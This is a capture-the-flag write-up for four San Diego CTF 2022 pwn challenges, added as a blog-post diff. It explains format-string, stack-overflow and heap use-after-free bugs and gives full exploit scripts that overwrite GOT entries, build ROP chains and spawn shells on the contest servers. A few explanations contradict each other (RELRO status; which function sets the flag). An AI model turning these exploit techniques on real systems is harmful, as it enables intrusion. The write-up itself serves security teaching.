@@ -1,0 +1,437 @@
+---
+title: San Diego CTF 2022
+date: 2022-05-10
+postLayout: simple
+tags:
+- "linux"
+- "ctf"
+- "rop"
+- "heap"
+- "format-string"
+---
+I played this CTF with **[Project Sekai](https://ctftime.org/team/169557)** and it was really great. We came 5th in the CTF.
+
+![](https://i.imgur.com/7Uwtq3R.png)
+
+- - -
+
+## Oil Spill
+
+- **Description** : Darn, these oil spills are going crazy nowadays. It looks like there's a little bit more than oil coming out of this program though...
+- **Challenge File** : [chall](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/SanDiegoCTF-21/oil_spill)
+- **Solves** : 73
+- **Points** : 200
+
+### Checksec
+
+<pre>
+    Arch:     amd64-64-little
+    RELRO:    <font color="#FD5FF1">No RELRO</font>
+    Stack:    <font color="#87C38A">Canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x3ff000)</font>
+    RUNPATH:  <font color="#FD5FF1">b&apos;./&apos;</font>
+</pre>
+
+### Overview
+
+![](https://i.imgur.com/ZLcnejq.png)
+
+The main function leaks the address of `puts`, `printf`, `our_input`, and `temp`. So we have libc address leak, stack leak which isn't required and PIE leak which is not required as well. 
+The `temp` is just a useless function which is never called in the binary. 
+
+The main function takes 300 bytes from stdin and  stores it in our_input. And then it is being printed back to the stdout using `printf` without any format specifiers on our_input. So we have a **format string bug** here. We control the first parameter to the `printf` function so we can use it to leak arbitrary data using `%p`, `%s`, `%x` and so many. And we can also write arbitrary data to memory using the `%n` specifier.  We can use that for our advantage. 
+
+At the end the main function gives a calls to `puts` with `x` as the argument. `x` is a global variable in the bss segment. So it is both readable and writable. 
+
+![](https://i.imgur.com/xMwBnvr.png)
+
+![](https://i.imgur.com/3LLohQZ.png)
+
+As per the docs the `xinfo` command 
+
+```
+Shows offsets of the specified address to useful other locations
+```
+
+### Exploit
+
+* First use the leaks from the main function to determine the libc base address.
+* Since the binary uses <span style={{ color: 'green' }}>Partial Relro</span>.
+  use the fmt bug to overwrite the got of `puts` function to `system` address and at the same time overwrite the `x` global variable to "/bin/sh". 
+* Get shell
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from time import sleep
+
+exe  = context.binary = ELF('./OilSpill')
+host = args.HOST or 'oil.sdc.tf'
+port = int(args.PORT or 1337)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+libc=SetupLibcELF()
+io = start()
+
+leaks=GetInt(rl())
+libc.address = leaks[0]-libc.sym.puts
+re()
+payload = fmtstr_payload(8, {exe.got.puts : libc.sym.system, 0x600c80 : b"/bin/sh\x00"}, write_size='short')
+lb()
+pause()
+sl(payload)
+
+io.interactive()
+```
+
+- - -
+
+## Horoscope
+
+- **Description** : This program will predict your future! 
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/SanDiegoCTF-21/horoscope)
+- **Solves** : 125 
+- **Points** : 100 
+
+### Checksec
+
+<pre>
+    Arch:     amd64-64-little
+    RELRO:    <font color="#FFD7B1">Partial RELRO</font>
+    Stack:    <font color="#FD5FF1">No canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x400000)</font>
+</pre>
+
+### Overview
+
+![](https://i.imgur.com/lRAqXfM.png)
+
+The main function takes an input of 320 bytes from stdin to `our_input`. `our_input` is a character array of 48 bytes. So the bug here is buffer overflow. 
+
+And then our input is passed as an parameter to `processInput` function. 
+
+![](https://i.imgur.com/4ugL9pr.png)
+
+So we have to pass default case and return from the function to trigger the buffer overflow vulnerability and hijack the RIP. We can easily do this by prepending `1/1/1/1/` before the padding. Lets check some other functions in the binary.
+
+There is a `test` and a `debug` function in the binary which are never called.
+
+![](https://i.imgur.com/OvHja3m.png)
+
+![](https://i.imgur.com/Z5WIokP.png)
+
+Here the `temp` is just a global variable and it is initially 0 when the binary is running. We can set it to 1 by calling the `debug` function and then call the `test` function in our rop chain to execute `system("/bin/sh");` 
+
+### Exploit
+
+* Begin the payload with `1/1/1/1/` to return from the `processInput` function.
+* 48 bytes of padding to overflow the stack and reach RIP.
+* call the `test` function to set `temp` variable to 1.
+* call the debug function to execute `system("/bin/sh");`
+* Get shell.
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from time import sleep
+
+exe  = context.binary = ELF('./horoscope')
+host = args.HOST or 'horoscope.sdc.tf'
+port = int(args.PORT or 1337)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+libc=SetupLibcELF()
+io = start()
+
+padding = b"1/1/1/1/" + b"A"*48 + p(exe.sym.debug) + p(exe.sym.test)
+
+re()
+sl(padding)
+
+io.interactive()
+```
+
+- - -
+
+## Breakfast-Menu
+
+- **Description** : I’m awfully hungry, with all these options to choose from, what should I order? 
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/SanDiegoCTF-21/bf_menu)
+- **Solves** : 32 
+- **Points** : 250 
+ 
+### Checksec
+
+<pre>
+    Arch:     amd64-64-little
+    RELRO:    <font color="#FFD7B1">Partial RELRO</font>
+    Stack:    <font color="#FD5FF1">No canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x3ff000)</font>
+</pre>
+
+### Overview
+
+```c
+int main(int argc,
+    const char ** argv,
+        const char ** envp) {
+    int OPTION; // [rsp+10h] [rbp-10h] BYREF
+    int GLOBAL_IDX; // [rsp+14h] [rbp-Ch]
+    unsigned __int64 v5; // [rsp+18h] [rbp-8h]
+
+    v5 = __readfsqword(0x28);
+    puts("Welcome to the SDCTF cafe!\n");
+    puts(
+        "This restaurant works a little different than normal ones. First, tell us if you want to make a new order, then you "
+        "can change or delete orders.\n");
+    fflush(stdout);
+    GLOBAL_IDX = 0;
+    while (1) {
+        puts("1. Create a new order\n2. Edit an order\n3. Delete an order\n4. Pay your bill and leave");
+        fflush(stdout);
+        memset(buf, 0, sizeof(buf));
+        __isoc99_scanf("%d", & OPTION);
+        getchar();
+        if (OPTION == 2) {
+            puts("which order would you like to modify");
+            fflush(stdout);
+            __isoc99_scanf("%d", & OPTION);
+            getchar();
+            if (GLOBAL_IDX <= OPTION)
+                goto INVALID;
+            puts("We have eggs, cereal, waffles and french toast. \nWhat would you like to order?");
+            fflush(stdout);
+            if (fgets(buf, 64, stdin)) {
+                printf("so you wanted %s", buf);
+                fflush(stdout);
+            }
+            strcpy(orders[OPTION], buf);
+        } else if (OPTION > 2) {
+            if (OPTION != 3) {
+                if (OPTION == 4) {
+                    puts("thanks for coming!");
+                    fflush(stdout);
+                    exit(0);
+                }
+                LABEL_21:
+                    exit(0);
+            }
+            puts("which order would you like to remove");
+            fflush(stdout);
+            __isoc99_scanf("%d", & OPTION);
+            getchar();
+            if (GLOBAL_IDX <= OPTION) {
+                INVALID: puts("Order doesn't exist!!!");
+                fflush(stdout);
+            }
+            else {
+                free(orders[OPTION]);
+            }
+        } else {
+            if (OPTION != 1)
+                goto LABEL_21;
+            if (GLOBAL_IDX <= 15) {
+                orders[GLOBAL_IDX++] = malloc(40);
+                puts("A new order has been created");
+            } else {
+                puts("Too many orders, you can't be making any more!!!");
+            }
+            fflush(stdout);
+        }
+    }
+}
+```
+
+<span style={{ color: 'red' }}>This is the <b>worst</b> way of creating a heap challenge</span>. 
+
+The author `green beans` just why would did you keep all the code in main function. The decompiled code looks ugly af. And then comes those `fflush` function. 
+
+![](https://i.imgur.com/TZHR9di.png)
+
+The options looks like this
+
+1. Create a note of size 40 bytes and increment `GLOBAL_IDX.` Store the heap pointer to an array of pointers in bss that's the `orders` array.
+2. Modify/write the contents to any notes that you have already created. It does this by taking 64 bytes of input from stdin using `fgets` function to a global buffer `buf` and then uses `strcpy` to copy the contents of `buf` variable to `orders[idx]`.
+3. Free any note that you have already created.
+4. Exit.
+
+The bugs in this challenge are :
+
+1. The edit option has an **heap overflow** bug. It copies 64 bytes to a 0x31 sized chunk.
+2. While specifying the index , it allows **negative indexing**. With this you can overwrite the contents in stdout structure in libc. But it uses `strcpy` to copy the contents so its painful to do any fsop.
+3. **Use After Free & Double free** bug. This allows **Write After Free** primitive.
+
+![](https://i.imgur.com/bfNf1Li.jpg)
+
+For leaks overwrite `free` got with `printf`. So that you can then have a **format string bug** when you delete a note. It will then do `printf(our_input)` instead of actually freeing it.
+
+### Exploit
+
+1. Create a chunk `A`.
+2. Delete that chunk `A`.
+3. Using the **write after free** bug. Edit chunk `A` to overwrite its fd with the got address of `free`.
+4. Overwrite `free` got with `printf` plt to create a format string bug scenario to get leaks.
+5. Edit chunk `A` with `%11$p`.
+6. Delete chunk `A`.
+7. Get libc leak.
+8. Edit the chunk back again and overwrite `free` got with `system` this time.
+9. Edit chunk `A` with "/bin/sh".
+10. Delete chunk `A`.
+11. Get shell
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from time import sleep
+
+exe  = context.binary = ELF('./BreakfastMenu')
+host = args.HOST or 'breakfast.sdc.tf'
+port = int(args.PORT or 1337)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+idx=-1
+
+def choice(cmd):
+	sla("4. Pay your bill and leave\n", str(cmd))
+
+def create():
+	global idx
+	choice(1)
+	idx=idx+1
+	return idx
+
+def edit(idx, data):
+	choice(2)
+	sla("which order would you like to modify\n", str(idx))
+	sla("What would you like to order?\n", data)
+
+def delete(idx):
+	choice(3)
+	sla("which order would you like to remove\n", str(idx))
+
+libc=SetupLibcELF()
+io = start()
+A=create()
+delete(A)
+edit(A, p64(exe.got.free - 8))
+junk=create()
+target=create() # returns heap above the free got
+edit(target, b"A"*8 + p(exe.sym.printf))
+edit(A, "%9$p||%10$p||%11$p||%12$p||%13$p||%14$p||%15$p||%16$p")
+delete(A) # trigger format string bug
+leaks=GetInt(rl())
+libc.address = leaks[2]-0x21c87
+lb()
+edit(target, b"A"*8 + p(libc.sym.system))
+edit(A, "/bin/sh\x00")
+delete(A)
+io.interactive()
+```
+
+- - -
+
+## Secure Horoscope
+
+- **Description** : Our horoscope developers have pivoted to a more security-focused approach to predicting the future. You won’t find breaking into this one quite so easy! 
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/SanDiegoCTF-21/secure_horoscope)
+- **Solves** : 53 
+- **Points** : 250 
+
+
+### Checksec
+
+<pre>
+    Arch:     amd64-64-little
+    RELRO:    <font color="#FFD7B1">Partial RELRO</font>
+    Stack:    <font color="#FD5FF1">No canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x3ff000)</font>
+    RUNPATH:  <font color="#FD5FF1">b&apos;./&apos;</font>
+</pre>
+
+### Overview
+
+![](https://i.imgur.com/qOB9Hom.png)
+
+![](https://i.imgur.com/iGJLhst.png)
+
+The `main` function reads 40 bytes to a 40 byte character array which is safe. And in the `getInfo` function it reads 140 bytes of user input from stdin to `info` variable which is a 100 byte character array. So there is a **stack buffer overflow** bug here. 
+
+### Exploit
+
+* Input anything you want in your first input.
+* 112 bytes of padding + RBP -> bss  + RIP -> `0x4007cf` 
+
+<div style={{ display: 'flex', justifyContent: 'center' }}>
+    ![](https://i.imgur.com/0TuhK8w.png)
+    />
+</div>
+
+Now you can read 140 bytes of rop chain in bss and stack pivot there.
+
+* The rop chain uses the fancy `3d_gadget` ? xD. I am not going to explain on the gadget much as i have done [here](https://4n0nym4u5.netlify.app/post/asian-cyber-security-challenge-2021/) in this challenge.
+
+```asm
+0x000000004006a8: add [rbp-0x3d], ebx; nop [rax+rax]; rep ret; 
+```
+
+* So the rop chain will change the got of `fflush` to `one_gadget` and we then stack pivot on `fflush` to run the `one_gadget`.
+<div style={{ display: 'flex', justifyContent: 'center' }}>
+    ![](https://i.imgur.com/zXILsbo.png)
+    />
+</div>
+
+Here is the final exploit. 
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from time import sleep
+
+exe  = context.binary = ELF('./secureHoroscope')
+host = args.HOST or 'sechoroscope.sdc.tf'
+port = int(args.PORT or 1337)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+libc=SetupLibcELF()
+io = start()
+
+sla("To get started, tell us how you feel\n", "A")
+sla("day/year/time) and we will have your very own horoscope\n\n", b"A"*112 + p(0x6010c0+0x70) + p(0x00000000004007cf) + p(0xdeadbeef) )
+rop = add_gadget(exe.got.fflush, libc.address+0x7e790, one_shot()[1]) + pivot(exe.got.fflush)
+sl( rop.ljust(112, b"A")  + p(0x6010c0-8) + gadget("leave; ret") )
+
+io.interactive()
+```
